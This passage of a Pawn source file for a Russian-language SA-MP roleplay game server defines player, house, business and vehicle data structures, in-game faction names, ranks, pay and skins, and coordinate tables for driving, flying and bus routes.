	{101.3177,383.7229,11.9637},
	{-134.1562,594.9006,12.1406},
	{-231.8404,454.2404,12.9151},
	{-280.8139,580.0370,12.1206},
	{-800.4487,942.7859,12.3800},
	{-933.7875,1215.9216,10.5244},
	{-1055.8240,2207.0906,38.1050},
	{-1507.9191,1612.1322,36.5690},
	{-2672.4431,2808.2336,37.6816},
	{-2476.3145,1660.4136,52.4983},
	{-2382.1455,31.4998,21.3210},
	{-2081.0181,-176.7534,25.9049},
	{-905.2241,-1731.6660,39.6549},
	{-485.5703,-1564.8060,41.1359},
	{-261.4032,-1199.6196,41.0734},
	{820.4319,-1333.1212,40.7113},
	{453.7762,-1261.6862,40.7311},
	{2549.4641,-2201.5798,21.9607},
	{2757.6372,-2206.8928,21.9503},
	{2378.2329,-1906.2671,22.6751},
	{2216.6892,-1827.6821,22.1349},
	{2132.9319,-2026.3188,18.8125},
	{1931.0350,-1913.5259,34.0686},
	{2322.8079,-248.3545,1.9882},
	{2216.7544,-194.0977,2.1658},
	{2821.9919,-362.4589,3.5891},
	{2484.4292,-721.1086,12.3000},
	{-1136.9601,-297.2443,1.3515},
	{-402.9984,-193.3205,3.1925},
	{174.5240,-362.7764,4.0425},
	{600.4114,-193.8554,4.0000},
	{935.3773,-167.2040,4.0466},
	{1353.5968,-164.2699,4.1900},
	{2285.4792,1377.5254,11.9110},
	{1825.4053,1347.6874,9.9800},
	{1983.0709,1871.7318,15.5280},
	{1979.8823,1979.6416,2.6679},
	{1930.9879,2029.4849,15.8694},
	{1800.5748,2503.3882,15.8725}
};

new g_pickup_present[sizeof PresentObject];*/

enum pInfo {
	pID,
	pPassword[32],
	pSecurityCode,
	pCheckCode,
	pInputCode,
	pMail[64],
	pMailConfirmed,
	pIP[16],
	pLastIP[16],
	pRegIP[16],
	pRegData[15],
	pVhData[15],
	pLevel,
	pCash,
	pBank,
	pAdmin,
	pModel,
	pMemberSkin,
	pAuthenticator,
	pLic[4],
	pLics[16],
	pSex,
	pAge,
	pExp,
	pMuted,
	pWarn,
	pLWarn,
	pAWarn,
	pDeActivate,
	pGun[13],
	pAmmo[13],
	pGunSkill[8],
	pLeader,
	pTempLeader,
	pRank,
	pVoennik,
	pMember,
	pFracWarn,
	pCheckTime,
	pNews,
	pPhoneBalance,
	pPhones,
	pPhoneNumber,
	pText[4],
	pTexts[20],
	pJail,
	pJailTime,
	pWanted,
	pWantedTime,
	pWantedWho[MAX_PLAYER_NAME],
	pWantedReason[32],
Float:pHeal,
	pDrugs,
	pPatron,
	pGunAmount,
	pCrimes,
	pJob,
	pColor,
	pMarried,
	pWhoMarried[MAX_PLAYER_NAME],
	pReferal[MAX_PLAYER_NAME],
	pRefMoney,
	pPayCheck,
	pCharity,
	pVip,
	pVipTime,
	pTime,
	pBusTime,
	pFightStyle,
	pCredits,
	pTotalCredits,
	pSkin[3],
	pSpawnChange,
	pHunger,
	Float:pHealthS,
	pSportExp,
	pOnline,
	pZakon,
	pCity,
	pPhone[2],
	pImproves[32],
	pImprove[4],
	pBed,
	pWatch,
	pSprunk,
	pAptechka,
	pTaxiSkill,
   	pWorkSalary,
   	pVK,
   	pAduty,
	//------------
	SalonCarID,
	GruzCarID,
	TruckerCarID,
	TaxiCarID,
	BusCarID,
	MechanicCarID,
	//-------------
	pName[MAX_PLAYER_NAME],
	pSettings,
	Spectating[2],
	PlayerText:SpecTxt,
	pAFK,
	pDonateCar,
	pCredit,
	pCreditMoney,
	pCopter,
	pCopterColor[2],
	PlayerCopterID,
	pBottles,
	//pPresent[sizeof PresentObject],
	//--------
	pBusTimer,
	pBusID,
	pInteractionPlayer,
	P_TUNING_TYPE,
	P_COLOR[2],
	P_TUNING_STATE,
	P_PEDAL,
	P_TYPE_SPEED,
	P_LAST_VEHICLE,
	P_BOMB,
	P_BUG,
	P_FAMILY,
	P_FAMILY_COLOR,
	P_MENU_COLOR,
	P_REALTOR_TYPE,
	P_PB_TEAM,
	P_PB_KILLS,
	P_PB_DEATHS,
	P_OWNABLE_CAR[MAX_PLAYER_OWNABLE_CARS],
	P_GRUZ_CAR,
	P_LOAD_JOB,
	P_ORDER_ID,
	P_ORDER_TIME,
	P_ORDER_BIZ_ID,
	P_AREND_SCOOTER,
	P_SALON,
	P_IN_ENTRANCE,
	P_IN_ROOM,
	P_ENTRANCE,
	P_ROOM,
	P_LISTETING,
	P_GNEWS,
	P_GNEWS_TIME,
	P_JOB,
	//
	P_SPEC_ADM,
    GOOGLEAUTH[17],
   	GOOGLEAUTHSETTING,
	NewPlayerAmmo,
	PlayerAmmo,
	P_UNLOCK_LEVEL,
	pMaxBottles
};
new PI[MAX_PLAYERS][pInfo];
new Text3D:FamilyName[MAX_PLAYERS];
/*new
	player_default_values[pInfo] =
{
	-1, 							// ид аккаунта
	EOS,							// пароль
	0,								// защитный код
	0,								// проверка кода
	0,								// введён ли код
	EOS,							// почта
	0, 								// активирована ли почта
	"0.0.0.0",						// ip
	"0.0.0.0",						// last ip
	"0.0.0.0",						// reg ip
	"0.0.0",						// reg data
	"0.0.0",						// enter data
	0,								// уровень
	0,								// деньги
	0,								// деньги в банке
	0,								// админка
	0,								// cmodel
	0,								// скин во фраке
	0,								// пол
	0,								// возраст
	0,								// exp
	0,								// мут
	0,								// варн
	0,								// лварн
	0,								// аварн
	0,								// деактивация
	"0,0,0,0",						// лицензии
	"0,0,0,0",						// лицензии
	"0,0,0,0,0,0,0,0,0,0,0,0,0", 	// оружие
	"0,0,0,0,0,0,0,0,0,0,0,0,0", 	// патроны
	"0,0,0,0,0,0,0,0",				// скиллы игрока
	0,								// лидерка
	0,								// врем. лидерка
	0,	// ранг
	0,	// военник
	0,	// орг.
	0,	// чек время
	0,	// новости
	0,	// баланс телефона
	0,								// номер телефона
	{0, 0, 0, 0},	// текста
	{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},	// текста
	0,								// тюрьма
	0,								// время тюрьма
	0,								// звезды
	0,								// арест. время
	EOS,							// кто розыск
	0.0,							// хп
	0,								// нарко
	0,								// патроны
	0,								// патроны ган
	0,								// crimes
	0,	// работа
	0,	// цвета
	0,	// женат(а)
	EOS,	// имя жены(мужа)
	EOS,	// реферал
	0,		// деньги реферал
	0,		// зп
	0,		// пожертвования
	0,		// випка
	0. 		// время випка
	0,		// время
	0,		// автобус время
	0,		// стиль
	0,		// кредиты
	0,		// тек. кредиты
	{0,0,0},	// скины
	0,		// спавн
	0,		// еда
	0.0,	// еда
	0,		// спорт exp
	0,		// онлайн
	0,		// законка
	0,		// город
	{0, 0},	// телефон (1)
	{0, 0},	// телефон (2)
	{0, 0, 0, 0, 0, 0, 0},	// улучшения (2)
	{0, 0, 0, 0, 0, 0, 0},	// улучшения (2)
	0,		// койка
	0,		// просмотр
	0,		// спрайт
	0,		// аптечка
	0,		// дальнобойщик скилл
	0,		// таксист скилл
	0,		// work salary
	0,		// семья
	0,		// создатель в семье
	0,		// зам в семье
	// ------------
	INVALID_VEHICLE_ID,	// тачка в автосалоне
	INVALID_VEHICLE_ID, // груз
	INVALID_VEHICLE_ID, // дальнобойщик
	INVALID_VEHICLE_ID, // такси
	INVALID_VEHICLE_ID,	// автобус
	INVALID_VEHICLE_ID,	// механик
	// ------------
	EOS,	// ник
	0,		// настройки_персонажа
	{0, 0},	// спек
	-1,		// текст спек
	0,		// афк
	0,		// 3 слот
	0,		// кредит
	0,		// деньги кредит
	0,		// верт
	{0, 0},	// цвета верт
	INVALID_VEHICLE_ID,	// ид верта
	// ------------
	INVALID_VEHICLE_ID,	// ид личного тс
	-1,	// время автобус
	-1,	// ид автобуса
	INVALID_PLAYER_ID	// взаимодействие с
};*/


enum E_GARAGES_STRUCT
{
	G_SQL_ID,
	G_OWNER[21],
	Float: G_POS_X,
	Float: G_POS_Y,
	Float: G_POS_Z,
	Float: G_ANGLE,
	G_IMPROVEMENTS,
	G_PARKED_CAR,
	G_PRICE,

	Text3D: G_LABEL
}

new g_garages[MAX_GARAGES][E_GARAGES_STRUCT];

enum hInfo
{
	hID,
Float:hEntrx,
Float:hEntry,
Float:hEntrz,
Float:hExitx,
Float:hExity,
Float:hExitz,
Float:hCarx,
Float:hCary,
Float:hCarz,
Float:hCarfa,
	hOwner[MAX_PLAYER_NAME],
	hDiscript,
	hPrice,
	hBuyPrice,
	hInt,
	hVirtual,
	hLock,
	hMIcon,
	hPickup,
Text3D:hPickupExit,
	hOplata,
	hHeal,
	hGarage,
	hAutoDoors,
	Text3D:hCupboardText,
	hCS,
	hMoney,
	hPatrons,
	hDrugs
};
new HouseInfo[MAX_HOUSES][hInfo];
new lastveh;

enum atm
{
	aID,
Float:aX,
Float:aY,
Float:aZ,
Float:arX,
Float:arY,
Float:arZ,
};
new ATMInfo[MAX_ATM][atm], TOTALATM;
new ATM[MAX_ATM];
new Text3D:LABELATM[MAX_ATM];

enum bzInfo
{
	bID,
Float:bEntrx,
Float:bEntry,
Float:bEntrz,
Float:bExitx,
Float:bExity,
Float:bExitz,
Float:B_ENTER_X,
Float:B_ENTER_Y,
Float:B_ENTER_Z,
Float:B_ENTER_A,
	bOwner[MAX_PLAYER_NAME],
	bPrice,
	bBuyPrice,
	bMoney,
	bType,
	bInt,
	bVirtual,
	bLock,
	bEnter,
	bMIcon,
	bIcon,
	bPickup,
	bPickupExit,
	bName[32],
	bProduct,
	bTill,
	bMenu,
	bLockTime,
	bControl,
	bOplata
};
new BizzInfo[MAX_BIZZ][bzInfo];

new Text3D:LABELBIZZ[MAX_BIZZ];
new BizzPay[MAX_BIZZ];
new fuelcheck;

enum vInfo
{
	vID,
	vModel,
	vColors[32],
	vColor[2],
	Float:vPos_X,
	Float:vPos_Y,
	Float:vPos_Z,
	Float:vPos_FA,
	vInt,
	vWorld,
	vVehicle,
	vFraction,
	vStatus,
	vCost,
	veh_number[32],
	veh_type_num
//Float:vMileage
};
new VehInfo[MAX_VCARS][vInfo];

enum aInfo
{
	aText[128],
	aName[MAX_PLAYER_NAME],
	aPhone,
};
new AdvertInfo[MAX_ADVERTS][2][aInfo];

new FracBank[11];
new DrugsBank[MAX_FRACTIONS];


new const
	g_organization[][] =
{
	{"Администрация области"},
	{"МВД"},
	{"Министерство Здравоохранение"},
	{"Автошкола"},
	{"ОПГ \"Тамбовская\""},
	{"ОПГ \"Подольская\""},
	{"Армия"},
	{"Итальянская мафия"},
	{"Русская мафия"},
	{"СМИ"},
	{"ФСБ"}
};

new org_list[][] =
{
	{TEAM_MERIA},
	{TEAM_POLICIA},
	{TEAM_POLICIA2},
	{TEAM_BOLNICA},
	{TEAM_AUTOSCHOOL},
	{TEAM_GROOVE},
	{TEAM_BALLAS},
	{TEAM_ARMIYA},
	{TEAM_OPG1},
	{TEAM_RSM},
	{TEAM_SMI},
	{TEAM_SWAT}
};

static const stock Fraction_Name[MAX_FRACTIONS][32] = {
	"Нет",
	"Администрация области",
	"ППС",
	"ДПС",
	"ФСБ",
	"Миннистерство Здравоохранение",
	"Автошкола",
	"ОПГ \"Тамбовская\"",
	"ОПГ \"Подольская\"",
	"",
	"",
	"",
	"Армия",
	"--",
	"--",
	"Итальянская мафия",
	"Русская Мафия",
	"--",
	"СМИ",
	"--",
	"--",
	"ОМОН",
	"--",
	"--",
	"--",
	"--"
};

static const stock Fraction_Rang[MAX_FRACTIONS][MAX_RANGS][32] = {
	{"Нет","","","","","","","","","","","","","","","",""},
	{"","Водитель","Охранник","Нач. охраны","Адвокат","Мин. обороны","Мин. внутренних дел","Мин. здрав","Мэр","Премьер-министр","Президент","","","","","",""},
	{"","Кадет","Рядовой","Сержант","Старший Сержант","Лейтенант","Ст.Лейтенант","Капитан","Майор","Подполковник","Полковник","Генерал","","","","",""},//полиция 1
	{"","Кадет","Рядовой","Сержант","Старший Сержант","Лейтенант","Ст.Лейтенант","Капитан","Майор","Подполковник","Полковник","Генерал","","","","",""},//полиция 2
	{"","Стажёр","Агент ФСБ","Сотрудник СУ","Сотрудник Управления 'Н'","Сотрудник УСБ","Начальник СУ","Начальник Управления 'Н'","Начальник УСБ","Зам. директора","Директор","","","","","",""},
	{"","Интерн","Санитар","Медбрат","Спасатель","Нарколог","Доктор","Психолог","Хирург","Заместитель главного врача","Главный врач","","","","","",""},
	{"","Стажёр","Консультант","Экзаменатор","Младший инструктор","Инструктор","Менеджер","Заместитель директора","Директор","","","","","","","",""},
	{"","Плейя","Хастла","Килла","Юонг","Гангста","О.Г.","Мобста","Де Кинг","Легенд","Мэд Дог","","","","","",""},
	{"","Блайд","Бастер","Крекер","Гун Бро","Ап Бро","Ганкстер","Федерал Блок","Фолкс","Райч Нига","Биг Вилли","","","","","",""},
	{"","Раро","Эстраньо","Навато","Ординарио","Эстимадро","Латино","Амиго","Криминаль","Проксимо","Падре","","","","","",""},
	{"","Перро","Тирадор","Геттор","Лас Герас","Мирандо","Сабио","Инвасор","Тессореро","Нестро","Падре","","","","","",""},
	{"","Новато","Ординарио","Локал","Вирификадо","V.E.G.","Ассесино","Бандито","Лидер V.E.G.","Проксимо","Падре","","","","","",""},
	{"","Рядовой","Ефоейтор","Младший сержант","Сержант","Старшина","Лейтенант","Капитан","Майор","Подполковник","Полковник","Генерал","","","","",""},
	{"","","","","","","","","","","","","","","","",""},
	{"","","","","","","","","","","","","","","","",""},
	{"","Новицио","Ассосиато","Сомбаттенте","Солдато","Боец","Сотто-Капо","Капо","Босс","Консильере","Дон","","","","","",""},
	{"","Щипач","Браток","Шнырь","Фраер","Барыга","Сторожила","Жиган","Свояк","Авторитет","Вор в законе","","","","","",""},
	{"","Щипач","Браток","Шнырь","Фраер","Барыга","Сторожила","Жиган","Свояк","Авторитет","Вор в законе","","","","","",""},
	{"","Стажер","Звукооператор","Звукорежиссер","Репортёр","Ведущий","Редактор","Гл.Редактор","Тех.Редактор","Программный редактор","Директор","","","","","",""},
	{"","","","","","","","","","","","","","","","",""},
	{"","","","","","","","","","","","","","","","",""},
	{"","","","","","","","","","","","","","","","",""},
	{"","","","","","","","","","","","","","","","",""},
	{"","","","","","","","","","","","","","","","",""},
	{"","","","","","","","","","","","","","","","",""},
	{"","","","","","","","","","","","","","","","",""}
};

static const stock Fraction_Pay[MAX_FRACTIONS][17] = {
	{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},
	/* госы*/
	{15000,20000,25000,30000,35000,40000,45000,50000,55000,60000,70000,0,0,0,0,0}, // Правительство
	{15000,20000,25000,30000,35000,40000,45000,50000,55000,60000,70000,0,0,0,0,0}, // МВД
	{15000,20000,25000,30000,35000,40000,45000,50000,55000,60000,70000,0,0,0,0,0}, // Гибдд
	{15000,20000,25000,30000,35000,40000,45000,50000,55000,60000,70000,0,0,0,0,0},// ФСИН
	{15000,20000,25000,30000,35000,40000,45000,50000,55000,60000,70000,0,0,0,0,0}, // Больница LS
	{10000,12000,15000,20000,25000,30000,32000,35000,40000,50000,0,0,0,0,0,0,0}, // Автошкола
	/* мафии и тп*/
	{4500,6000,7000,8000,10000,12000,14000,16000,18000,20000,0,0,0,0,0,0}, // ФК ЦСКА
	{4500,6000,7000,8000,10000,12000,14000,16000,18000,20000,0,0,0,0,0,0}, // ФК Спартак
	{4500,6000,7000,8000,10000,12000,14000,16000,18000,20000,0,0,0,0,0,0}, // Рифа
	{4500,6000,7000,8000,10000,12000,14000,16000,18000,20000,0,0,0,0,0,0}, // Ацтек
	{4500,6000,7000,8000,10000,12000,14000,16000,18000,20000,0,0,0,0,0,0}, // Вагос
	/* госы */
	{15000,20000,25000,30000,35000,40000,45000,50000,55000,60000,70000,0,0,0,0,0}, // Армия
	{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}, // Свободный слот для организации
	{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}, // Свободный слот для организации
	/* мафия и тп */
	{4500,6000,7000,8000,10000,12000,14000,16000,18000,20000,0,0,0,0,0,0}, // Итальянская Мафия
	{4500,6000,7000,8000,10000,12000,14000,16000,18000,20000,0,0,0,0,0,0}, // Русская Мафия
	{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}, // Свободный слот для организации
	{4500,6000,7000,8000,10000,12000,14000,16000,18000,20000,0,0,0,0,0,0}, // СМИ
	{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}, // Свободный слот для организации
	{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}, // Свободный слот для организации
	/* госы */
	{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}, // Свободный слот для организации
	{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}, // Свободный слот для организации
 	{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}, // Свободный слот для организации
	{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}, // Свободный слот для организации
	{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0} // Свободный слот для организаций
};
//42 Зэк _ 60 ж адвокат _ 73 Армейка _
static const stock Fraction_Skin[MAX_FRACTIONS][9] = {
	{0,0,0,0,0,0,0,0}, // Гражданский
	{17,37,39,147,187,0}, // Правительство
    {290,289,294,268,291,299,298,297,282}, // МВД
    {281,265,270,284,267,269,264,288,282}, // Гибдд
    {141,163,164,165,166,222,0,0}, // ФСБ
    {274,275,276,70,0,0,0,0}, // Больница АЗ
	{11,189,171,172,0,0,0,0}, // Автошкола
	{124,125,126,127,0,0,0,0}, // тамбовская
	{117,119,120,0,0,0,0,0}, // подольская
	{1,0,0,0,0,0,0,0}, // Закрыто
	{1,0,0,0,0,0,0,0}, // Закрыто
	{1,0,0,0,0,0,0,0}, // Закрыто
	{94,191,73,272,278,1,86}, // Армия
	{0,0,0,0,0,0,0,0}, // Свободный слот для организации
	{0,0,0,0,0,0,0,0}, // Свободный слот для организации
	{118,122,228,0,0,0,0,0}, // Якуза
	{111,112,113,0,0,0,0,0}, // Русская Мафия
	{1,0,0,0,0,0,0,0}, // ЛКН
	{59,91,185,188,217,250,261,0}, // СМИ
	{1,0,0,0,0,0,0,0}, // Закрыто
	{1,0,0,0,0,0,0,0}, // Закрыто
	{1,0,0,0,0,0,0,0}, // Спецназ
	{1,0,0,0,0,0,0,0}, // Больница SF
	{1,0,0,0,0,0,0,0}, // Больница LV
	{1,0,0,0,0,0,0,0}, // Администрация области SF
	{1,0,0,0,0,0,0,0}  // Администрация области LV
};

new player_hour_time[MAX_PLAYERS] ;

new DerevoTimer[MAX_PLAYERS];
new GoDerevo[MAX_PLAYERS];
new Float:RandomWood[2][3] = {
	{835.8714,520.8663,12.0959},
	{828.1499,483.7570,12.0959}
};

// 29
static const stock Float:DrivingTest[][6] = {
	{1899.6517,2246.5349,15.9095, 1887.0807,2201.9712,16.0329},
	{1887.0807,2201.9712,16.0329, 1887.1703,2141.7307,16.0340},
	{1887.1703,2141.7307,16.0340, 1887.2716,2065.8665,16.0506},
	{1961.3928,2033.7277,16.0333, 1961.3928,2033.7277,16.0333},
	{1962.7013,1918.0162,15.6653, 1962.7013,1918.0162,15.6653},
	{2042.0293,1903.9966,16.0687, 2231.6516,1903.4723,16.0765},
	{2231.6516,1903.4723,16.0765, 2351.6052,1910.2813,16.0568},
	{2351.6052,1910.2813,16.0568, 2354.3796,1981.4652,16.0573},
	{2354.3796,1981.4652,16.0573, 2346.5225,2143.1484,12.3060},
	{2346.5225,2143.1484,12.3060, 2346.5608,2306.8665,12.3060},
	{2346.5608,2306.8665,12.3060, 2282.7173,2347.2432,12.3060},
	{2282.7173,2347.2432,12.3060, 2164.3684,2346.5183,12.3034},
	{2164.3684,2346.5183,12.3034, 2123.3701,2440.1743,16.5857},
	{2123.3701,2440.1743,16.5857, 1991.5444,2556.8228,14.2553},
	{1991.5444,2556.8228,14.2553, 1936.1963,2654.0779,15.3318},
	{1936.1963,2654.0779,15.3318, 1864.1427,2616.6699,15.3663},
	{1864.1427,2616.6699,15.3663, 1773.3887,2555.1143,15.3455},
	{1773.3887,2555.1143,15.3455, 1763.3506,2489.7844,16.0875},
	{1763.3506,2489.7844,16.0875, 1839.8497,2376.4302,16.0572},
	{1839.8497,2376.4302,16.0572, 1886.9063,2292.4268,16.0798},
	{1886.9063,2292.4268,16.0798, 1900.0099,2246.6570,15.8547},
	{1900.0099,2246.6570,15.8547, 1920.8632,2247.2505,15.8427},
	{1920.8632,2247.2505,15.8427,0.0,0.0,0.0}
};
//	{605.7759,490.9171,11.6787,631.0452,480.3650,11.8008},

/*static const stock Float:FlyTest[][6] = {
	{-2010.7413,-39.4386,95.4837,-2006.9191,180.9614,95.4578},
	{-2006.9191,180.9614,95.4578,-2004.4702,472.4755,95.4234},
	{-2004.4702,472.4755,95.4234,-2117.8350,503.7773,95.4222},
	{-2117.8350,503.7773,95.4222,-2281.6128,509.3513,95.4102},
	{-2281.6128,509.3513,95.4102,-2458.8994,467.2858,95.3948},
	{-2458.8994,467.2858,95.3948,-2539.0950,334.9100,52.3313},
	{-2539.0950,334.9100,52.3313,-2462.2209,203.1778,97.3129},
	{-2462.2209,203.1778,97.3129,-2216.7964,208.8197,61.5710},
	{-2216.7964,208.8197,61.5710,-2154.8650,131.3025,69.0865},
	{-2154.8650,131.3025,69.0865,-2164.0918,-6.3266,69.0949},
	{-2164.0918,-6.3266,69.0949,-2136.0110,-166.9167,69.1069},
	{-2136.0110,-166.9167,69.1069,-2038.3370,-216.1395,35.7256},
	{-2038.3370,-216.1395,35.7256,0.0,0.0,0.0}
};*/

static const stock Float:FlyTest[][6] = {
	{-950.0515,1201.0569,50.6982,-893.7199,1227.5979,50.6238},
	{-893.7199,1227.5979,50.6238,-547.7677,1184.5780,50.6233},
	{-547.7677,1184.5780,50.6233,-298.0084,1181.5786,52.4258},
	{-298.0084,1181.5786,52.4258,-242.1688,1444.5007,53.0130},
	{-242.1688,1444.5007,53.0130,-539.8865,1647.8232,53.0188},
	{-539.8865,1647.8232,53.0188,-954.3989,1690.4968,77.9466},
	{-954.3989,1690.4968,77.9466,-1238.7745,1725.8593,77.9470},
	{-1238.7745,1725.8593,77.9470,-1817.6339,1797.8414,77.9481},
	{-1817.6339,1797.8414,77.9481,-1847.3127,1317.1688,77.9326},
	{-1847.3127,1317.1688,77.9326,-1400.9312,1315.5398,77.9334},
	{-1400.9312,1315.5398,77.9334,-940.8593,1211.7378,42.3903},
	{-940.8593,1211.7378,42.3903,-908.2900,1180.0339,10.7230},
	{-908.2900,1180.0339,10.7230,0.0,0.0,0.0}
};

static const stock Float:WaterTest[][6] = {
	{-319.9310,1118.4384,-0.5542,-446.2031,1126.5291,-0.5364},
	{-446.2031,1126.5291,-0.5364,-550.6663,1129.5288,-0.5253},
	{-550.6663,1129.5288,-0.5253,-681.6774,1120.2677,-0.4831},
	{-681.6774,1120.2677,-0.4831,-785.7746,1098.9353,-0.5207},
	{-785.7746,1098.9353,-0.5207,-852.6362,1091.9144,-0.5193},
	{-852.6362,1091.9144,-0.5193,-904.4830,1078.5370,-0.4908},
	{-904.4830,1078.5370,-0.4908,-921.5145,1031.2369,-0.5278},
	{-921.5145,1031.2369,-0.5278,-850.0370,1039.6714,-0.4904},
	{-850.0370,1039.6714,-0.4904,-733.8455,1072.5927,-0.5193},
	{-733.8455,1072.5927,-0.5193,-630.7943,1094.0684,-0.5039},
	{-630.7943,1094.0684,-0.5039,-505.5291,1104.7987,-0.5659},
	{-505.5291,1104.7987,-0.5659,-416.2155,1108.5116,-0.5171},
	{-416.2155,1108.5116,-0.5171,-299.4394,1112.1766,-0.5509},
	{-299.4394,1112.1766,-0.5509,0.0,0.0,0.0}
};

static const stock Float:BusCityLV[][] = {
	{-710.8743,965.0538,12.1026,-609.7674,965.0527,12.1141},
	{-609.7674,965.0527,12.1141,-393.3902,964.2781,12.0941},
	{-393.3902,964.2781,12.0941,-385.1540,928.7322,12.0941},
	{-385.1540,928.7322,12.0941,386.7371,705.1396,12.1264},
	{-386.7371,705.1396,12.1264,-386.1244,630.9739,12.0951},
	{-386.1244,630.9739,12.0951,-284.6586,592.7407,12.0941},
	{-284.6586,592.7407,12.0941,-66.6421,564.5627,12.0949},
	{-66.6421,564.5627,12.0949,-62.1453,531.1238,12.0951},
	{-62.1453,531.1238,12.0951,-94.2526,334.8975,12.0951},
	{-94.2526,334.8975,12.0951,-111.6479,230.4643,12.3694},
	{-111.6479,230.4643,12.3694,-141.8777,48.0396,12.3736},
	{-141.8777,48.0396,12.3736,-173.2749,-145.4125,1.4005},
	{-173.2749,-145.4125,1.4005,-120.8839,-157.7223,1.3787},
	{-120.8839,-157.7223,1.3787,-26.3597,-156.9720,3.1349},
	{-26.3597,-156.9720,3.1349,115.3118,-157.8755,4.3067},
	{115.3118,-157.8755,4.3067,196.6042,-156.8860,4.3259},
	{196.6042,-156.8860,4.3259,202.9656,-205.3640,4.3245},
	{202.9656,-205.3640,4.3245,202.9759,-303.2773,4.3246},
	{202.9759,-303.2773,4.3246,199.9220,-357.2036,4.2581},
	{199.9220,-357.2036,4.2581,208.7955,-340.2405,4.3085},
	{208.7955,-340.2405,4.3085,208.1037,-163.4628,4.3234},
	{208.1037,-163.4628,4.3234,177.6586,-152.7642,4.3418},
	{177.6586,-152.7642,4.3418,-134.7911,-149.8063,1.3420},
	{-134.7911,-149.8063,1.3420,-163.3210,-153.0159,1.4160},
	{-163.3210,-153.0159,1.4160,-165.5533,-131.4632,1.3825},
	{-165.5533,-131.4632,1.3825,-151.6434,-46.1005,4.3599},
	{-151.6434,-46.1005,4.3599, -131.2660,76.4276,12.3809},
	{-131.2660,76.4276,12.3809,-94.1060,298.2881,12.3785},
	{-94.1060,298.2881,12.3785,-51.4914,545.6058,12.0951},
	{-51.4914,545.6058,12.0951,-284.4241,607.8356,12.0941},
	{-284.4241,607.8356,12.0941,-362.6739,614.9729,12.0951},
	{-362.6739,614.9729,12.0951,-372.2780,656.7633,12.0952},
	{-372.2780,656.7633,12.0952,-371.2540,954.8768,12.0943},
	{-371.2540,954.8768,12.0943,-408.5797,977.6666,12.0949},
	{-408.5797,977.6666,12.0949,-722.0510,979.3763,12.1042},
	{-722.0510,979.3763,12.1042,-744.5497,953.0797,12.2531},
	{-744.5497,953.0797,12.2531,0.0,0.0,0.0}

};

static const stock Float:BusCitySF[][] = {
	{-703.5718,964.7751,12.1031,-394.0823,964.3934,12.0938},
	{-394.0823,964.3934,12.0938,-354.9529,964.3803,12.0951},
	{-354.9529,964.3803,12.0951,-110.5897,914.5716,12.0938},
	{-110.5897,914.5716,12.0938,0.3837,873.1287,12.0938},
	{0.3837,873.1287,12.0938,28.6052,890.5668,12.0931},
	{28.6052,890.5668,12.0931,86.0752,1090.2957,12.0941},
	{86.0752,1090.2957,12.0941,132.2034,1318.8555,12.0942},
	{132.2034,1318.8555,12.0942,163.4416,1472.8859,12.0941},
	{163.4416,1472.8859,12.0941,195.7612,1483.2920,12.1747},
	{195.7612,1483.2920,12.1747,193.4783,1443.7032,12.1560},
	{193.4783,1443.7032,12.1560,176.9738,1361.3123,12.1751},
	{176.9738,1361.3123,12.1751,140.2091,1182.3271,12.1951},
	{140.2091,1182.3271,12.1951,108.0496,1091.7445,12.0940},
	{108.0496,1091.7445,12.0940,56.2064,1044.4491,12.0930},
	{56.2064,1044.4491,12.0930,43.1755,966.8984,12.0941},
	{43.1755,966.8984,12.0941,16.5029,896.0454,12.0941},
	{16.5029,896.0454,12.0941,-25.4146,898.3145,12.0934},
	{-25.4146,898.3145,12.0934,-131.4482,938.7707,12.0943},
	{-131.4482,938.7707,12.0943,-363.7038,978.2903,12.0951},
	{-363.7038,978.2903,12.0951,-734.9941,979.1884,12.1041},
	{-734.9941,979.1884,12.1041,-739.6608,951.0529,12.2531},
	{-739.6608,951.0529,12.2531,0.0,0.0,0.0}

};

// 39
static const stock Float:BusCityLS[][] = {
	{-512.4056,950.9902,11.7028, -452.4863,898.8409,11.7029},
	{-452.4863,898.8409,11.7029, -479.3744,911.2106,11.7082},//stop
	{-479.3744,911.2106,11.7082, -331.1064,964.5189,11.7568},
	{-331.1064,964.5189,11.7568, -71.2505,900.6967,11.7571},
	{-71.2505,900.6967,11.7571, 82.1516,843.1108,11.7565},
	{82.1516,843.1108,11.7565, 191.0464,802.5015,11.7565},
	{191.0464,802.5015,11.7565, 345.8317,744.4478,11.7571},
	{345.8317,744.4478,11.7571, 516.0753,663.0292,11.7548},
	{516.0753,663.0292,11.7548,	469.0131,520.0646,11.7570},
	{469.0131,520.0646,11.7570, 484.9727,426.4232,11.7570},
	{484.9727,426.4232,11.7570, 670.4041,445.6132,11.7509},
	{670.4041,445.6132,11.7509, 769.1450,541.4628,11.7558}, // stop
	{769.1450,541.4628,11.7558, 761.6680,599.4681,11.7587},
	{761.6680,599.4681,11.7587,728.9720,700.5469,11.7587}, //last
	{728.9720,700.5469,11.7587, 842.9287,1017.2566,11.7594},
	{842.9287,1017.2566,11.7594, 846.5505,1258.7252,11.7621},
	{846.5505,1258.7252,11.7621, 689.9892,1538.6527,11.7576},
	{689.9892,1538.6527,11.7576, 350.6502,1707.5741,11.7555},
	{350.6502,1707.5741,11.7555, 421.6208,1895.5389,8.9088},
	{421.6208,1895.5389,8.9088, 488.6609,2111.5317,13.6081},
	{488.6609,2111.5317,13.6081, 596.8802,2290.1545,19.9251},
	{596.8802,2290.1545,19.9251, 764.7816,2566.7786,19.9244},
	{764.7816,2566.7786,19.9244, 933.6754,2755.0088,17.3958},
	{933.6754,2755.0088,17.3958, 1154.9272,2785.9937,14.6398},
	{1154.9272,2785.9937,14.6398, 1434.2725,2775.0491,12.7506},
	{1434.2725,2775.0491,12.7506, 1770.9369,2778.5105,12.4752},
	{1770.9369,2778.5105,12.4752, 2064.9211,2791.1394,12.0889},
